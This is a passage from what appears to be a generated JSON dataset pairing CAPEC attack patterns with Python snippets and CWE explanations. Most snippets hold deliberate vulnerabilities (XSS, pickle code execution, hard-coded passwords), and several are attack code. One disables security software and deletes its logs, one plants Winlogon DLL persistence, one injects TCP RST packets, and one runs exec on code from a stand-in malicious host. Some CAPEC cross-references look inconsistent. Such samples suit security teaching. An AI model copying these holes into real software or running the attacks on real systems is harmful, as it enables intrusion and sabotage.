        "capec_name": "Account Footprinting",
        "code_snippet": "import os\n\n# Function to get user information\n# This function exposes sensitive information to unauthorized users\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_user_info():\n    # Using os.system to execute a command that reveals sensitive information\n    # CWE-214: Invocation of Process Using Visible Sensitive Information\n    os.system('net user > user_info.txt')\n    with open('user_info.txt', 'r') as file:\n        data = file.read()\n    return data\n\n# Function call\nuser_info = get_user_info()\nprint(user_info)",
        "description": "This Python code snippet demonstrates a function that retrieves user information from a Windows system using the 'net user' command and stores it in a file. The function then reads the content of the file and returns it. This code embodies the concept of 'Account Footprinting' (CAPEC) by exposing sensitive information about user accounts on the system. The use of 'os.system' to execute the command and store the output in a file represents CWE-214, as the command and its output can be visible to unauthorized actors. Additionally, the function exposes sensitive system information (CWE-497) and sensitive information to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\n\n# Function to list all groups and their members\n# This function exposes sensitive information to unauthorized users\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\ndef list_groups():\n    groups = os.popen('net localgroup').read()\n    return groups\n\n# Function to add a user to a group\n# CWE-842: Placement of User into Incorrect Group\ndef add_user_to_group(user, group):\n    os.system(f'net localgroup {group} {user} /add')\n\n# Example usage\nif __name__ == '__main__':\n    # Exposing sensitive information\n    print(\"Listing all groups and their members:\")\n    print(list_groups())\n\n    # Adding a user to a group (potentially incorrect group)\n    add_user_to_group('exampleUser', 'Administrators')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit group permission footprinting. The `list_groups` function uses the `net localgroup` command to list all groups and their members on a Windows system, exposing sensitive information (CWE-200, CWE-529). The `add_user_to_group` function adds a user to a specified group, which could lead to placing a user into an incorrect group (CWE-842). The code highlights how an adversary can gather information about user groups and permissions, potentially leading to further targeted attacks."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to get the last modified time of a file\n# This simulates the 'dir /A ntuser.dat' command on Windows\n# and exposes sensitive information about user activity\n\ndef get_last_modified_time(file_path):\n    try:\n        # Check if the file exists\n        if os.path.exists(file_path):\n            # Get the last modified time\n            last_modified_time = os.path.getmtime(file_path)\n            # Convert to a readable format\n            readable_time = time.ctime(last_modified_time)\n            return readable_time\n        else:\n            return \"File does not exist\"\n    except Exception as e:\n        return str(e)\n\n# Example usage\nfile_path = '/home/user/ntuser.dat'  # Path to the target file\nprint(f\"Last modified time of {file_path}: {get_last_modified_time(file_path)}\")",
        "description": "This Python code snippet demonstrates how to retrieve the last modified time of a file, which can be used to infer user activity on a system. The function 'get_last_modified_time' checks if the specified file exists and then retrieves its last modified time, converting it to a human-readable format. This simulates the 'dir /A ntuser.dat' command on Windows, which can expose sensitive information about user activity. The code embodies the main idea of the CAPEC 'Owner Footprinting' by showing how an adversary might exploit file metadata to gather information about system users. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497) and the invocation of processes that might reveal sensitive data (CWE-214)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nadmin_password = 'hardcoded_password'\n\n# Function to disable security software\n# CWE-284: Improper Access Control\n# CWE-671: Lack of Administrator Control over Security\n# CWE-1037 & CWE-733: Potential issues with optimization removing security-critical code\n\ndef disable_security_software(password):\n    if password == admin_password:\n        try:\n            # Example of killing a security process\n            subprocess.run(['taskkill', '/F', '/IM', 'security_software.exe'], check=True)\n            # Example of deleting a registry key\n            os.system('reg delete HKLM\\Software\\SecuritySoftware /f')\n            # Example of deleting log files\n            os.remove('C:\\path\\to\\security_logs.log')\n            print('Security software disabled.')\n        except Exception as e:\n            print(f'Error disabling security software: {e}')\n    else:\n        print('Invalid password.')\n\n# Example usage\nuser_password = input('Enter admin password to disable security software: ')\ndisable_security_software(user_password)",
        "description": "This Python code snippet demonstrates a scenario where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The function `disable_security_software` takes a password as input and, if it matches the hard-coded admin password, proceeds to disable security software by killing a process, deleting a registry key, and removing log files. This represents the CAPEC 'Disable Security Software' by showing how an attacker can exploit weaknesses to disable security mechanisms. The code also highlights potential issues with lack of administrator control over security settings (CWE-671) and the risk of security-critical code being removed or modified by compiler or processor optimizations (CWE-1037 & CWE-733)."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\n\n# Vulnerable code: Modifying Winlogon registry key to load a malicious DLL\ntry:\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, 'C:\\malicious.dll')\n    winreg.CloseKey(key)\n    print('Registry key modified successfully.')\nexcept Exception as e:\n    print(f'Failed to modify registry key: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where the Winlogon registry key is modified to load a malicious DLL at startup. The code opens the Winlogon registry key and sets the 'Userinit' value to a path of a malicious DLL. This represents the CAPEC 'Replace Winlogon Helper DLL' by showing how an adversary can exploit this feature to load adversarial code at startup. The code also touches on CWE-15 (External Control of System or Configuration Setting) by allowing external control over a critical system setting, and CWE-427 (Uncontrolled Search Path Element) by potentially allowing an unintended actor to control the DLL path."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to simulate a login process\ndef login(username, password):\n    # Simulate checking username\n    if username == 'admin':\n        time.sleep(0.5)  # Simulate time delay for valid user\n        if password == 'password123':\n            return 'Login successful'\n        else:\n            return 'Invalid password'\n    else:\n        time.sleep(0.1)  # Simulate time delay for invalid user\n        return 'Invalid username'\n\n# Function to expose system information\ndef get_system_info():\n    return os.popen('uname -a').read()\n\n# Main function to demonstrate system footprinting\nif __name__ == '__main__':\n    # Simulate an attacker probing the system\n    print(login('admin', 'wrongpassword'))  # Observable timing discrepancy\n    print(login('user', 'password123'))     # Observable timing discrepancy\n    print(get_system_info())                # Exposure of sensitive system information",
        "description": "This Python code snippet demonstrates the concept of 'System Footprinting' by simulating a login process and exposing system information. The login function introduces observable timing discrepancies (CWE-208) based on whether the username is valid or not, which can be exploited by an attacker to infer valid usernames. The get_system_info function exposes sensitive system information (CWE-497) to unauthorized users. This code embodies the main idea of CAPEC-170 by showing how an adversary can probe and gather security-relevant information about a system through observable discrepancies and exposed information."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# Function to list installed security software\ndef list_security_software():\n    try:\n        # Example command to list installed software (Windows)\n        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)\n        installed_software = installed_software.decode('utf-8')\n        security_tools = [tool for tool in installed_software.split('\\n') if 'antivirus' in tool.lower() or 'firewall' in tool.lower()]\n        return security_tools\n    except Exception as e:\n        return str(e)\n\n# Function to get firewall status\ndef get_firewall_status():\n    try:\n        # Example command to get firewall status (Windows)\n        firewall_status = subprocess.check_output(['netsh', 'advfirewall', 'show', 'allprofiles'], shell=True)\n        return firewall_status.decode('utf-8')\n    except Exception as e:\n        return str(e)\n\n# Main function to footprint security software\ndef security_footprinting():\n    security_info = {}\n    security_info['installed_security_software'] = list_security_software()\n    security_info['firewall_status'] = get_firewall_status()\n    return security_info\n\n# Example usage\nif __name__ == '__main__':\n    footprint = security_footprinting()\n    print(footprint)",
        "description": "This Python code snippet demonstrates the concept of 'Security Software Footprinting' by attempting to list installed security software and retrieve the firewall status on a Windows system. The `list_security_software` function uses the `wmic` command to get a list of installed software and filters it for security tools like antivirus or firewall software. The `get_firewall_status` function uses the `netsh` command to get the status of the firewall. The `security_footprinting` function combines these functionalities to gather security-related information about the system. This code embodies the CAPEC idea by showing how an adversary might gather information about the security tools and configurations on a target system. The related CWEs are represented by the potential exposure of sensitive system information (CWE-497) and the possibility of embedding malicious code (CWE-506) to perform such footprinting activities."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\n\n# Simulate a network route disabling attack\nclass RouteDisabler:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.running = False\n\n    def start_attack(self):\n        self.running = True\n        threading.Thread(target=self._disable_route).start()\n\n    def stop_attack(self):\n        self.running = False\n\n    def _disable_route(self):\n        while self.running:\n            try:\n                # Create a socket to simulate route disabling\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.target_ip, self.target_port))\n                s.shutdown(socket.SHUT_RDWR)\n                s.close()\n            except Exception as e:\n                pass\n\n# Example usage\nif __name__ == '__main__':\n    disabler = RouteDisabler('192.168.1.1', 80)\n    disabler.start_attack()\n    # Let the attack run for 10 seconds\n    threading.Timer(10, disabler.stop_attack).start()",
        "description": "This Python code snippet simulates a network route disabling attack, which aligns with the CAPEC description of 'Route Disabling'. The `RouteDisabler` class is designed to repeatedly open and close a socket connection to a target IP and port, effectively disrupting the communication channel. This embodies the idea of severing the communication route between two entities. The code also indirectly touches on related CWEs by demonstrating how improper handling of communication channels can lead to vulnerabilities. For instance, the repeated opening and closing of sockets can be seen as a form of unauthorized error injection (CWE-1334) and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# Simulate disabling network hardware by shutting down the network interface\n# This represents the CAPEC idea of physically disabling networking hardware\n\n# Function to disable network interface\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\ndef disable_network_interface(interface):\n    try:\n        # Improperly restricts software interface to hardware features\n        os.system(f'sudo ifconfig {interface} down')\n        print(f'Network interface {interface} has been disabled.')\n    except Exception as e:\n        # Improper protection for outbound error messages\n        print(f'Failed to disable network interface: {e}')\n\n# Function to simulate error injection\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n\ndef inject_error():\n    try:\n        # Simulate error injection by writing to a system file\n        with open('/sys/class/net/eth0/device/uevent', 'w') as f:\n            f.write('add@/devices/pci0000:00/0000:00:19.0/net/eth0')\n        print('Error injected into network hardware.')\n    except Exception as e:\n        print(f'Failed to inject error: {e}')\n\n# Main function to execute the attack pattern\n\ndef main():\n    network_interface = 'eth0'\n    disable_network_interface(network_interface)\n    time.sleep(5)  # Wait for 5 seconds to simulate downtime\n    inject_error()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of the CAPEC 'Disabling Network Hardware' by simulating the disabling of a network interface and injecting errors into the network hardware. The `disable_network_interface` function uses the `os.system` call to shut down a specified network interface, representing the physical disabling of networking hardware (CWE-1256, CWE-1304, CWE-1320). The `inject_error` function simulates unauthorized error injection into the network hardware (CWE-1334). The `main` function orchestrates these actions, first disabling the network interface and then injecting an error after a short delay. This code highlights the potential vulnerabilities and consequences of improper handling of hardware interfaces and error conditions."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n\ndef send_bgp_update(target_ip, bgp_message):\n    try:\n        # Create a socket connection to the target IP\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, 179))  # BGP typically uses port 179\n\n        # CWE-757: Using a less secure algorithm for message integrity\n        # Here, we are not using any encryption or authentication\n        s.sendall(bgp_message.encode('utf-8'))\n\n        # CWE-924: Not ensuring message integrity\n        # No checks to ensure the message was not modified during transmission\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# CWE-941: Incorrectly specified destination\n# Sending BGP update to an incorrect IP to disrupt routing\nmalicious_bgp_message = 'BGP UPDATE: Withdraw route 192.168.1.0/24'\nsend_bgp_update('192.0.2.1', malicious_bgp_message)  # Incorrect IP for demonstration",
        "description": "This Python code snippet demonstrates a simplified version of a BGP route disabling attack. The function `send_bgp_update` attempts to send a BGP update message to a specified target IP address. The message is intended to withdraw a route, which can disrupt network routing if successful. The code embodies several related CWEs: it sends the message to an incorrectly specified destination (CWE-941), does not ensure message integrity during transmission (CWE-924), and does not use any secure algorithm for message integrity (CWE-757). This represents the main idea of the CAPEC by showing how an adversary could manipulate BGP messages to disrupt network availability."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_domain(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        trusted_domains = ['trusted.com', 'secure.org']\n        return any(hostname.endswith(domain) for domain in trusted_domains)\n    except socket.herror:\n        return False\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(user_input_url):\n    if is_trusted_domain(user_input_url):\n        return requests.get(user_input_url)\n    else:\n        return 'Untrusted domain!'\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f'<html><body>{user_input}</body></html>'\n\n# Example usage\nuser_ip = '192.0.2.1'\nuser_url = 'http://untrusted.com'\nuser_input = '<script>alert(\"XSS\")</script>'\n\n# Check if the domain is trusted\nif is_trusted_domain(user_ip):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')\n\n# Redirect user\nprint(redirect_user(user_url))\n\n# Generate web page\nprint(generate_web_page(user_input))",
        "description": "This Python code snippet demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The function 'is_trusted_domain' performs reverse DNS resolution (CWE-350) to check if an IP address belongs to a trusted domain, but it may not ensure the IP address is truly associated with the hostname. The 'redirect_user' function uses this check to decide whether to redirect to a user-specified URL, potentially leading to open redirect vulnerabilities (CWE-601). The 'generate_web_page' function improperly neutralizes user input, making it susceptible to cross-site scripting (CWE-79). The code highlights how reliance on DNS resolution and improper input handling can lead to security issues, aligning with the idea of DNS Domain Seizure where an adversary can manipulate domain-related actions to disrupt services."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\nimport os\n\nclass SensitiveData:\n    def __init__(self, secret):\n        self.secret = secret\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (os.system, ('echo Malicious Code Executed',))\n\n# Simulate deserialization of untrusted data\nserialized_data = pickle.dumps(MaliciousPayload())\n\n# Vulnerable deserialization\ntry:\n    deserialized_object = pickle.loads(serialized_data)\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable deserialization process, which is the main idea of the CAPEC 'Object Injection'. The code uses the 'pickle' module to serialize and deserialize objects. The 'SensitiveData' class represents a class containing sensitive data (CWE-499). The 'MaliciousPayload' class is designed to exploit the deserialization process by overriding the '__reduce__' method to execute a system command (CWE-77). When the 'MaliciousPayload' object is deserialized, it triggers the execution of the embedded malicious code (CWE-506). This example highlights the risk of deserializing untrusted data (CWE-502), which can lead to remote code execution and other security issues."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <iframe src=\"http://trusted-site.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Malicious JavaScript interacting with the hidden iframe\n        var iframe = document.querySelector('iframe');\n        iframe.onload = function() {\n            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n            var sensitiveData = iframeDoc.getElementById('sensitiveData').innerText;\n            alert('Sensitive Data: ' + sensitiveData);\n        };\n    </script>\n</body>\n</html>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application that demonstrates a Cross Frame Scripting (XFS) attack. The main page includes an iframe that loads a trusted site, which is hidden from the user. The malicious JavaScript in the main page interacts with the hidden iframe to extract sensitive data from the trusted site. This example embodies the CAPEC description by combining a legitimate webpage loaded into a concealed iframe with malicious JavaScript. The code also touches on related CWEs, such as improper restriction of frames (CWE-1021) and cross-site scripting (CWE-79)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_input = request.args.get('input', '')\n    # Vulnerable to DOM-based XSS\n    template = f\"<html><body><script>var user_input = '{user_input}';</script></body></html>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a DOM-based XSS vulnerability using the Flask web framework. The application takes user input from a query parameter 'input' and directly inserts it into a JavaScript context within an HTML template. This is done without proper input validation or output encoding, making it susceptible to DOM-based XSS attacks. An attacker could craft a URL with malicious JavaScript code in the 'input' parameter, which would then be executed in the victim's browser when they visit the URL. This example embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\n# Vulnerable DNS request function\n\ndef vulnerable_dns_request(domain):\n    try:\n        # CWE-291: Reliance on IP Address for Authentication\n        ip_address = socket.gethostbyname(domain)\n        print(f\"IP address of {domain} is {ip_address}\")\n\n        # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        print(f\"Hostname for IP {ip_address} is {hostname}\")\n\n        # CWE-1327: Binding to an Unrestricted IP Address\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind(('0.0.0.0', 0))  # Binding to all interfaces\n        s.connect((ip_address, 80))\n        print(f\"Connected to {domain} at {ip_address}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nvulnerable_dns_request('example.com')",
        "description": "This Python code snippet demonstrates a vulnerable DNS request function that embodies the main idea of CAPEC-147: DNS Blocking. The function performs a DNS lookup for a given domain and then attempts to connect to the resolved IP address. The code includes several related CWEs: CWE-291 (Reliance on IP Address for Authentication), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), and CWE-1327 (Binding to an Unrestricted IP Address). The function is vulnerable to DNS blocking attacks, where an adversary can intercept and drop DNS requests, thereby denying access to specific services or content. Additionally, the use of unrestricted IP binding and reliance on IP addresses for authentication and security decisions further expose the system to potential attacks."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# Vulnerable server binding to all IP addresses (0.0.0.0)\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server listening on 0.0.0.0:8080')\n\nwhile True:\n    client_socket, client_address = server_socket.accept()\n    print(f'Connection from {client_address}')\n    # Vulnerable reliance on IP address for authentication\n    if client_address[0] == '192.168.1.100':\n        client_socket.send(b'Authenticated')\n    else:\n        client_socket.send(b'Access Denied')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server that embodies the main idea of the CAPEC 'IP Address Blocking' and related CWEs. The server binds to all IP addresses (0.0.0.0), which is a vulnerability described by CWE-1327. It listens for incoming connections and relies on the client's IP address for authentication (CWE-291). If the client's IP address matches '192.168.1.100', it sends an 'Authenticated' message; otherwise, it sends 'Access Denied'. This setup is vulnerable to IP address spoofing and does not adequately verify the identity of the client, making it susceptible to attacks that can block or disrupt access to the service."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to Reflected XSS\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Reflected Cross-Site Scripting (XSS). The application has a single route '/search' that takes a query parameter 'q' from the URL. The value of 'q' is directly inserted into the HTML response without any sanitization or neutralization, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'q' parameter, which would then be reflected back to the victim's browser and executed. This example embodies the main idea of CAPEC-86 (Reflected XSS) and highlights CWE-79 (Improper Neutralization of Input During Web Page Generation) by not properly handling user input before rendering it in the web page."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulated database\ncomments = []\n\n@app.route('/submit', methods=['POST'])\ndef submit_comment():\n    comment = request.form['comment']\n    # Vulnerable: Storing user input without proper sanitization\n    comments.append(comment)\n    return 'Comment submitted!'\n\n@app.route('/view')\ndef view_comments():\n    # Vulnerable: Rendering stored comments without proper sanitization\n    comments_html = ''.join(f'<p>{comment}</p>' for comment in comments)\n    return render_template_string(f'<html><body>{comments_html}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Stored Cross-site Scripting (XSS). The application has two routes: '/submit' for submitting comments and '/view' for viewing them. The comments are stored in a list without any sanitization or validation, and they are rendered directly in the HTML response. This allows an attacker to inject malicious scripts that will be stored and executed when other users view the comments. The code embodies the main idea of CAPEC-63 (Stored XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, request, redirect, url_for\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n# CWE-287: Improper Authentication\nusers = {'user1': 'password1', 'user2': 'password2'}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session['username'] = username  # CWE-384: Session Fixation\n        return redirect(url_for('dashboard'))\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'username' in session:\n        return f'Welcome {session[\"username\"]}'\n    return redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout():\n    session.pop('username', None)\n    return redirect(url_for('login'))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a login mechanism that is vulnerable to session hijacking. The code includes several weaknesses related to the CAPEC description:\n\n1. CWE-287 (Improper Authentication): The application uses a simple dictionary for user authentication without any robust verification mechanism.\n2. CWE-384 (Session Fixation): The session ID is not invalidated upon login, allowing an attacker to potentially hijack the session.\n3. CWE-613 (Insufficient Session Expiration): The session does not have an expiration mechanism, allowing reuse of old session credentials.\n\nThe code represents the main idea of session hijacking by showing how an attacker could exploit these weaknesses to gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Improper verification of source (CWE-940)\n        print(f'Received data: {data.decode()}')\n        # Cleartext transmission of sensitive information (CWE-319)\n        client_socket.send(b'Sensitive data: password123')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and handles them improperly. The server does not verify the source of the incoming connection (CWE-940), allowing an adversary to inject traffic. Additionally, it transmits sensitive information in cleartext (CWE-319), which can be intercepted by unauthorized actors. The code embodies the main idea of the CAPEC 'Traffic Injection' by demonstrating how an adversary can inject traffic into the network connection and potentially modify or intercept the content."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP reset packet\ndef create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 80, 4, 8192, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the reset packet\ndef send_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    packet = create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\n    sock.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.3'\ndst_port = 80\nseq_num = 1000\n\nsend_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)",
        "description": "This Python code snippet demonstrates how an attacker might inject a TCP reset packet to disrupt an active connection between two endpoints. The `create_reset_packet` function constructs a TCP reset packet with the given source and destination IP addresses and ports, as well as a sequence number. The `send_reset_packet` function sends this packet using a raw socket. This embodies the CAPEC 'Connection Reset' attack pattern by showing how an attacker can sever a connection without directly filtering the traffic. The code also touches on related CWEs, such as improper verification of the source of a communication channel (CWE-940) and improper enforcement of message integrity (CWE-924), by demonstrating how an attacker can spoof a reset packet to disrupt communication."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Target IP and port\ntarget_ip = '192.168.1.100'\ntarget_port = 80\n\n# Construct a TCP RST packet\n# Note: This is a simplified example and does not include full TCP/IP header construction\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # IP header (simplified)\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x50\\x14\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header with RST flag set\npacket = ip_header + tcp_header\n\n# Send the packet to the target\nsock.sendto(packet, (target_ip, target_port))\n\nprint('TCP RST packet sent to', target_ip)",
        "description": "This Python code snippet demonstrates a basic example of a TCP RST Injection attack. The code creates a raw socket and constructs a simplified TCP RST packet, which is then sent to a target IP address and port. The goal of this attack is to force the termination of an existing TCP connection between the target and a web server. This code embodies the main idea of the CAPEC by showing how an adversary can inject a TCP RST packet to disrupt a connection. The related CWEs provide additional context on potential weaknesses that could be exploited, such as improper verification of the source of a communication channel (CWE-940) and server-side request forgery (CWE-918)."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/app/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    if not full_path.startswith(base_directory):\n        raise ValueError('Attempted Path Traversal Attack')\n    \n    with open(full_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../../etc/passwd'\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a potential vulnerability to an Absolute Path Traversal attack. The function `read_file` takes a user-supplied `file_path` and attempts to read a file from a restricted base directory (`/var/www/app/data/`). The code constructs the full path by joining the base directory with the user input. However, it does not properly neutralize special path elements like '..', which can allow an attacker to traverse directories and access files outside the restricted directory. The check `if not full_path.startswith(base_directory):` is intended to prevent such attacks, but it is insufficient because `os.path.join` does not resolve the path, and an attacker can still exploit this by providing input like '../../etc/passwd'. This code snippet embodies the main idea of CAPEC-36 and related CWEs by illustrating how improper handling of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport requests\n\n# Vulnerable function that performs reverse DNS resolution\n# and makes a security decision based on the hostname\n\ndef get_hostname(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        return hostname\n    except socket.herror:\n        return None\n\n# Function that downloads code without integrity check\n\ndef download_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Function that performs a URL redirection to an untrusted site\n\ndef redirect_to_url(user_input_url):\n    return f'Redirecting to {user_input_url}'\n\n# Function that performs a server-side request without proper validation\n\ndef fetch_data_from_url(url):\n    response = requests.get(url)\n    return response.text\n\n# Example usage\nip_address = '192.168.1.1'\nhostname = get_hostname(ip_address)\nif hostname == 'trusted.example.com':\n    download_code('http://malicious.example.com/code.py')\nelse:\n    print('Untrusted hostname')\n\n# Redirect to a user-provided URL\nuser_input_url = 'http://untrusted.example.com'\nprint(redirect_to_url(user_input_url))\n\n# Fetch data from a URL without validation\nurl = 'http://untrusted.example.com/data'\ndata = fetch_data_from_url(url)\nprint(data)",
